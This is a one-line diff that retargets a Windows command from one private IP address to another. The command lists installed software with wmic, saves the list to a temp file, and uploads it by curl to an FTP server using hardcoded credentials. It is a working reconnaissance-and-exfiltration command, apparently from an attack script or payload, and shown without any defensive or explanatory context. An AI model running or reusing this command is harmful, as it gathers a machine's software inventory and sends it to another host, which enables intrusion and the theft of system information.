@@ -1,1 +1,1 @@
-wmic product get name,version > %temp%\message.txt && curl ftp://192.168.1.139:21/ --user WRdB7KNDc9AWQ9Cr:UskkrGc5UE3DbeT8 -T %temp%\message.txt
+wmic product get name,version > %temp%\message.txt && curl ftp://192.168.0.100:21/ --user WRdB7KNDc9AWQ9Cr:UskkrGc5UE3DbeT8 -T %temp%\message.txt
